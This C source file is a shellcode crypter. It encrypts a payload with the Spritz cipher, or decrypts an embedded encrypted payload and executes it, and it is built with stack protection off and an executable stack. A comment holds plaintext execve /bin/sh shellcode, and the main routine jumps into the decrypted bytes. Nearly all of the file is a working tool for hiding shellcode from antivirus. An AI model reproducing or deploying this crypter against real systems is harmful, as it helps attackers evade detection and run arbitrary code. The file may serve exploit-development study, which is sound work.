/* Compilation: gcc -fno-stack-protector -z execstack spritz-crypter.c -o spritz-crypter */
/**********************************************************************
*    spritz-crypter --  Program to encrypt payload with, or
*			to decrypt and execute payload
*			depending on the command line arguments
*                       We are using the experimental SPRITZ cypher
* 
*    Author   : Re4son re4son [ at ] whitedome.com.au
*    Purpose  : to encrypt / decrypt&execute a shellcode
*    Usage    : Encrypt shellcode:    ./spritz-crypter <password> -e
*		  then copy and paste the shellcode as shellcode below
*		  and recompile
*		Decrypt and execute:  ./spritz-crypter <password>
**********************************************************************/

#include <string.h>
#include <stdio.h>

/* execve bin/bash plaintext shellcode:
const unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
*/

const unsigned char shellcode[] = "\x7c\x49\x65\xd8\xec\x22\xfc\xb6\xa9\xc8\xf5\x2f\x2f\x26\x38\xac\xbe\x3f\x5f\xe4\x3f\x67\xf0\x82\x64";


#define LOW(B)  ((B) & 0xf)
#define HIGH(B) ((B) >> 4)
#define ARRAY_LENGTH	256
#define ALIGNED(S) __attribute__((aligned(S)))

ALIGNED(64) typedef struct State_ {
    unsigned char s[ARRAY_LENGTH];
    unsigned char a;
    unsigned char i;
    unsigned char j;
    unsigned char k;
    unsigned char w;
    unsigned char z;
} State;


static void initialize_state(State *state)
{
    unsigned int v;

    for (v = 0; v < ARRAY_LENGTH; v++) {
        state->s[v] = (unsigned char) v;
    }
    state->a = 0;
    state->i = 0;
    state->j = 0;
    state->k = 0;
    state->w = 1;
    state->z = 0;
}

static void update(State *state)
{
    unsigned char t;
    unsigned char y;

    state->i += state->w;
    y = state->j + state->s[state->i];
    state->j = state->k + state->s[y];
    state->k = state->i + state->k + state->s[state->j];
    t = state->s[state->i];
    state->s[state->i] = state->s[state->j];
    state->s[state->j] = t;
}

static unsigned char output(State *state)
{
    const unsigned char y1 = state->z + state->k;
    const unsigned char x1 = state->i + state->s[y1];
    const unsigned char y2 = state->j + state->s[x1];

    state->z = state->s[y2];

    return state->z;
}

static void crush(State *state)
{
    unsigned char v;
    unsigned char x1;
    unsigned char x2;
    unsigned char y;

    for (v = 0; v < ARRAY_LENGTH / 2; v++) {
        y = (ARRAY_LENGTH - 1) - v;
        x1 = state->s[v];
        x2 = state->s[y];
        if (x1 > x2) {
            state->s[v] = x2;
            state->s[y] = x1;
        } else {
            state->s[v] = x1;
            state->s[y] = x2;
        }
    }
}

static void whip(State *state)
{
    const unsigned int r = ARRAY_LENGTH * 2;
    unsigned int       v;

    for (v = 0; v < r; v++) {
        update(state);
    }
    state->w += 2;
}

static void shuffle(State *state)
{
    whip(state);
    crush(state);
    whip(state);
    crush(state);
    whip(state);
    state->a = 0;
}

static void absorb_stop(State *state)
{
    if (state->a == ARRAY_LENGTH / 2) {
        shuffle(state);
    }
    state->a++;
}

static void absorb_nibble(State *state, const unsigned char x)
{
    unsigned char t;
    unsigned char y;

    if (state->a == ARRAY_LENGTH / 2) {
        shuffle(state);
    }
    y = ARRAY_LENGTH / 2 + x;
    t = state->s[state->a];
    state->s[state->a] = state->s[y];
    state->s[y] = t;
    state->a++;
}

static void absorb_byte(State *state, const unsigned char b)
{
    absorb_nibble(state, LOW(b));
    absorb_nibble(state, HIGH(b));
}

static void absorb(State *state, const unsigned char *msg, size_t length)
{
    size_t v;

    for (v = 0; v < length; v++) {
        absorb_byte(state, msg[v]);
    }
}

static unsigned char drip(State *state)
{
    if (state->a > 0) {
        shuffle(state);
    }
    update(state);

    return output(state);
}

static void squeeze(State *state, unsigned char *out, size_t outlen)
{
    size_t v;

    if (state->a > 0) {
        shuffle(state);
    }
    for (v = 0; v < outlen; v++) {
        out[v] = drip(state);
    }
}

static void memzero(void *pnt, size_t len)
{
    volatile unsigned char *pnt_ = (volatile unsigned char *) pnt;
    size_t                     i = (size_t) 0U;

    while (i < len) {
        pnt_[i++] = 0U;
    }

}

static void key_setup(State *state, const unsigned char *key, size_t keylen)
{
    initialize_state(state);
    absorb(state, key, keylen);
}

int encrypt(unsigned char *out, const unsigned char *msg, size_t msglen,
               const unsigned char *key, size_t keylen)
{
    State  state;
    size_t v;

    key_setup(&state, key, keylen);
    for (v = 0; v < msglen; v++) {
        out[v] = msg[v] + drip(&state);

    }
    memzero(&state, sizeof state);

    return 0;
}

int decrypt(unsigned char *out, const unsigned char *c, size_t clen,
               const unsigned char *key, size_t keylen)
{
    State  state;
    size_t v;

    key_setup(&state, key, keylen);
    for (v = 0; v < clen; v++) {
        out[v] = c[v] - drip(&state);
    }
    memzero(&state, sizeof state);

    return 0;
}

main(int argc, char **argv)
{
    unsigned char       out[256];
    unsigned char 	*key;
    size_t              i, key_length;
    size_t 		shellcode_length = sizeof shellcode;
    int 		badchars = 0;
    int (*ret)() = (int(*)())out;

    if (argc == 1){
        fprintf(stderr,"Please provide a key\n");
        return -1;     
    } else {
	key = (unsigned char *)argv[1];
	key_length = strlen((char *)key);
	if(key_length > ARRAY_LENGTH){
		printf("Key is too long. It should be less than 256 characters\n");
		return(-1);
	}
    }

    if (argc > 2){
        encrypt(out, shellcode, shellcode_length, key, key_length);
	for (i = 0; i < (shellcode_length-1); i++) {
            printf("\\x%02x", out[i]);
	    if (out[i] == 0)
		badchars ++; 
        }
        printf("\n");
        if (badchars > 0){
	   printf("\n\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
	    printf("\t!!              WARNING            !!\n");
	    if (badchars == 1)
		printf("\t!!        Found %02d bad char        !!\n", badchars);
	    else
		printf("\t!!        Found %02d bad chars       !!\n", badchars);
	    printf("\t!!---------------------------------!!\n");
	    printf("\t!! Please use a different password !!\n");
	    printf("\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n");
         }
    } else {
        decrypt(out, shellcode, shellcode_length, key, key_length);
        ret();
    }
    
    return 0;
}

